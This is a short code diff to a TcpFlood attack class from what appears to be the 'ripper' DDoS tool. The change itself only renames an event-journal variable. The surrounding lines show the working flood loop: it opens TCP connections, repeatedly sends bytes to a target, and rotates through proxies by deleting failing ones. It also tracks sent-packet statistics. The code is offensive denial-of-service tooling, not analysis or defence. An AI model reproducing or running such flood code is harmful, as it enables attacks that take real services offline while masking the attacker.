@@ -12,7 +12,7 @@ from ripper.proxy import Proxy
 # Forward Reference
 Context = 'Context'
 
-events = EventsJournal()
+events_journal = EventsJournal()
 
 
 class TcpFlood(AttackMethod):
@@ -40,7 +40,7 @@ class TcpFlood(AttackMethod):
     def __call__(self, *args, **kwargs):
         with suppress(Exception), self.create_connection() as tcp_conn:
             self._target.stats.connect.status_success()
-            events.info('Creating new TCP connection...', target=self._target)
+            events_journal.info('Creating new TCP connection...', target=self._target)
             while self.send(tcp_conn):
                 if self._ctx.dry_run:
                     break
@@ -56,10 +56,10 @@ class TcpFlood(AttackMethod):
         try:
             sent = sock.send(send_bytes)
         except ProxyError as ep:
-            events.exception(ep, target=self._target)
+            events_journal.exception(ep, target=self._target)
             self._ctx.proxy_manager.delete_proxy_sync(self._proxy)
         except Exception as e:
-            events.exception(e, target=self._target)
+            events_journal.exception(e, target=self._target)
         else:
             self._target.stats.packets.status_sent(sent_bytes=sent)
             self._proxy.report_success() if self._proxy is not None else 0
